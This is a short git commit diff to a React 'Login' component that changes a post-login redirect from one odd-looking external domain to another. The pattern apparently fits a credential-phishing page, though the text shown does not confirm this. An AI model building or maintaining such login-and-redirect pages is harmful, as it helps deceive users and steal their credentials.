699d65151d756edaa4b9f1aaeb0c1262b49b333f
husknet <127146284+husknet@users.noreply.github.com>
2025-03-21 13:50:13 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://kr.moralemadefiles.top/';
+      window.location.href = 'https://kr.ca-abb.com/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
